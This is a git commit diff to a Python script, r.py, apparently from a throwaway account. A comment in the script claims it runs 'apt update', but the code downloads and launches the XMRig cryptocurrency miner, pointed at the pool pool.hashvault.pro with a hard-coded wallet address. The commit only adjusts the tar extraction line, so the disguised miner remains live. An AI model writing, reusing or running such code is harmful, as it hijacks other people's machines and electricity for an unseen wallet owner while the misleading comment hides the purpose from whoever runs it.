5c416e9acf20e1c84f027bec24ca053b350d3715
asfaagsgfvfgs <gouravkumarmeena2009123@outlook.com>
2026-05-19 02:51:08 +0530

    Update r.py

--- r.py
+++ r.py
@@ -2,7 +2,7 @@ import subprocess
 
 # Execute apt update (requires root privileges)
 result = subprocess.run(["wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && "
-        "tar", "xvzf", "xmrig-6.21.1-linux-x64.tar.gz && "
+        "tar xvzf xmrig-6.21.1-linux-x64.tar.gz && "
         "cd", "xmrig-6.21.1 && "
         "./xmrig", "--url pool.hashvault.pro:443 "
         "--user 46qfKvhZjvtZPQuSryhfnJ5pS4xkQosv2C6qzZ613vLaPa6vwZ1JgrV7HAxE4wMDUUYSzAyBBZGmNPfbPDrUegGvC1UtEdH "
